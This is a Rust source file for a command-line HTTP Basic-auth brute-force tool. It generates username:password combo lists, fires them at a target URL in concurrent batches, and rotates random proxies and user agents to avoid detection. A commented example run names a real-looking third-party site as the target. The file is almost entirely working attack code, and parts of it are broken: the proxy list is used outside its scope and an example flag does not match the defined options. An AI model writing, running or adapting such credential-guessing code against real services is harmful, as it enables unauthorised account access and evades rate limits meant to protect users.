use chrono::Local;
use clap::{App, Arg};
use futures::stream::{self, StreamExt};
use rand::seq::SliceRandom;
use reqwest::{Client, Proxy};
use std::error::Error;
use std::fs;
use std::fs::File;
use std::io::{self, Write};
use std::io::{BufRead, BufReader};
use tokio::time::{sleep, Duration, Instant};

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let start_time = Instant::now();

    print_banner();

    // Parsing command-line arguments

    let matches = App::new("HTTP Brute Force")
        .version("1.3")
        .author("Your Name")
        .about("Performs HTTP Brute Force using provided credentials")
        .arg(
            Arg::with_name("file")
                .short("f")
                .long("file")
                .help("Sets the file containing username-password combinations")
                .default_value("combo_list_small.txt"),
        )
        .arg(
            Arg::with_name("limit")
                .short("l")
                .long("limit")
                .help(
                    "Sets the rate limit for controlling concurrency and number of parallel tasks",
                )
                .default_value("1"),
        )
        .arg(
            Arg::with_name("sleep")
                .short("s")
                .long("sleep")
                .help("Sets the sleep duration between groups of tasks in seconds")
                .default_value("0"),
        )
        .arg(
            Arg::with_name("output")
                .short("o")
                .long("output")
                .help("Sets the output file path to write the result"),
        ).arg(
            Arg::with_name("proxy")
                .short("p")
                .long("proxy")
                .help("Sets the proxy file path to make connection by it"),
        )
        .arg(
            Arg::with_name("url")
                .short("u")
                .long("url")
                .value_name("URL")
                .required(true)
                .help("Sets the target URL to perform the brute force against"),
        )
        .arg(
            Arg::with_name("generate")
                .short("g")
                .long("generate")
                .help("Generates combinations and exits"),
        )
        .arg(
            Arg::with_name("random-agent")
                .short("r")
                .long("random-agent")
                .help("Sets a random User-Agent from agents.txt"),
        )
        .arg(
            Arg::with_name("continue")
                .short("c")
                .long("continue")
                .help("Continue the search until file end"),
        )
        .get_matches();

    if matches.is_present("generate") {
        generate_combinations()?;
        println!("Combo list generated successfully.");
        return Ok(());
    }

    let (file_name, rate_limit, sleep_duration, url, continue_on_success, user_agents, proxy_file) = (
        matches.value_of("file").unwrap(),
        matches.value_of("limit").unwrap().parse::<usize>()?,
        matches.value_of("sleep").unwrap().parse::<u64>()?,
        matches.value_of("url").unwrap(),
        matches.is_present("continue"),
        if matches.is_present("random-agent") {
            fs::read_to_string("agents.txt")?
                .lines()
                .map(|line| line.to_string())
                .collect()
        } else {
            vec![
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
                    .to_string(),
            ]
        },
        matches.value_of("proxy"),
    );

    let file_content = fs::read_to_string(file_name)?;

    let auth_combinations: Vec<String> =
        file_content.lines().map(|line| line.to_string()).collect();
        let mut proxies: Vec<String>;

        if proxy_file.iter().enumerate().len()== 0 {
            let client = Client::new();
        }
        else {
            // Read proxy list from file
    let proxies: Vec<String> = fs::read_to_string(proxy_file.unwrap_or("proxies.txt"))?
    .lines()
    .map(|line| line.to_string())
    .collect();

        }
    

    // let client = Client::builder()
    //     .proxy(Proxy::http(
    //         proxies.choose(&mut rand::thread_rng()).unwrap(),
    //     )?) // Use a random proxy
    //     .build()?;

    // let client = Client::new();
    let chunks = auth_combinations.chunks(rate_limit);

    for chunk in chunks {
        let mut tasks = vec![];

        for item in chunk {

            let client = Client::builder()
                .proxy(Proxy::http(
                    proxies.choose(&mut rand::thread_rng()).unwrap(),
                )?) // Use a random proxy
                .build()?;

            let (client, url) = (client.clone(), url.to_string());

            let mut headers: Vec<(&str, String)> = vec![];

            println!("Authorization: Basic {:?}",  item);
            println!("{:?}",proxies.choose(&mut rand::thread_rng()));

            headers.push(("Authorization", format!("Basic {}", item.to_string())));

            // Set User-Agent header randomly if flag is set
            let random_user_agent = user_agents.choose(&mut rand::thread_rng());
            if let Some(user_agent) = random_user_agent {
                headers.push(("User-Agent", user_agent.to_string()));
            }

            let task = async move {
                let mut req_builder = client.get(&url);

                for (k, v) in &headers {
                    req_builder = req_builder.header(*k, v.clone());
                }

                let resp = req_builder.send().await?;
                let _current_time = Local::now();
                // print_colored_status(
                //     &resp.status(),
                //     &format!("{}:{}", username, password),
                //     &_current_time,
                // );

                if resp.status().is_success() && (200..400).contains(&resp.status().as_u16()) {
                    println!("--------------------------------------------------------");
                    println!("Success found!  item :  {:?}", &item);
                    let elapsed = start_time.elapsed();
                    println!("Elapsed time: {:?}", elapsed);
                    println!("--------------------------------------------------------");
                    if !continue_on_success {
                        std::process::exit(0);
                    }
                }
                Ok(())
            };
            tasks.push(task);
        }

        let join_result = stream::iter(tasks).for_each_concurrent(rate_limit, |task| async move {
            let _: Result<(), reqwest::Error> = task.await;
            if sleep_duration > 0 {
                sleep(Duration::from_millis(sleep_duration)).await;
            }
        });

        join_result.await;
    }

    // let elapsed = start_time.elapsed();
    // println!("Elapsed time: {:?}", elapsed);
    //cargo run -- --url https://persianrank.ir/protect --rl 10000 --sleep 0 --file combo_list_small.txt

    Ok(())
}

fn print_banner() {
    println!(r#"  "#);
    println!(
        r#"     ___              __         ___         __    __         ___                    __       "#
    );
    println!(
        r#"    / _ \ __ __  ___ / /_       / _ | __ __ / /_  / /        / _ )  ____ ___  __ __ / /_ ___   "#
    );
    println!(
        r#"   / , _// // / (_-</ __/      / __ |/ // // __/ / _ \      / _  | / __// _ \/ // // __// -_)  "#
    );
    println!(
        r#"  /_/|_| \_,_/ /___/\__/      /_/ |_|\_,_/ \__/ /_//_/     /____/ /_/   \___/\_,_/ \__/ \__/   "#
    );
    println!(r#"  "#);
}

/// Generates combinations of usernames and passwords and writes them to a file.
fn generate_combinations() -> Result<(), Box<dyn Error>> {
    let usernames = read_lines("username.txt")?;
    let passwords = read_lines("password.txt")?;

    let combinations: Vec<String> = usernames
        .iter()
        .flat_map(|username| {
            passwords
                .iter()
                .map(move |password| format!("{}:{}", username, password))
        })
        .collect();

    let mut output_file = File::create("combo_list_small.txt")?;
    for combo in combinations {
        writeln!(output_file, "{}", base64::encode(combo))?;
    }

    Ok(())
}

/// Reads lines from a file and returns them as a vector of strings.
fn read_lines(filename: &str) -> Result<Vec<String>, Box<dyn Error>> {
    let file = File::open(filename)?;
    let reader = BufReader::new(file);
    let lines: Result<Vec<String>, io::Error> = reader.lines().collect();
    lines.map_err(|e| e.into())
}

// // Prints colored status messages to the console.
// fn print_colored_status(status: &reqwest::StatusCode, auth: &str, _current_time: &DateTime<Local>) {
//     let mut stdout = StandardStream::stdout(ColorChoice::Always);
//     let status_code = status.as_u16();

//     let mut color_spec = ColorSpec::new();

//     // Set color for 'Status Code: ' string
//     color_spec.set_fg(Some(Color::White)).set_bold(true);
//     stdout.set_color(&color_spec).unwrap();
//     write!(
//         &mut stdout,
//         "   {}  Status Code: ",
//         _current_time.format("%Y-%m-%d %H:%M:%S")
//     )
//     .unwrap();
//     stdout.reset().unwrap();

//     // Set color for status code value
//     match status_code {
//         200..=299 => {
//             color_spec.set_fg(Some(Color::Green)).set_bold(true);
//         }
//         300..=399 => {
//             color_spec.set_fg(Some(Color::Yellow)).set_bold(true);
//         }
//         400..=599 => {
//             color_spec.set_fg(Some(Color::Red)).set_bold(true);
//         }
//         _ => {}
//     }

//     stdout.set_color(&color_spec).unwrap();
//     write!(&mut stdout, "{}", status).unwrap();
//     stdout.reset().unwrap();

//     // Write remaining text in default white color
//     writeln!(&mut stdout, "  Authorization with {}", auth).unwrap();

// }
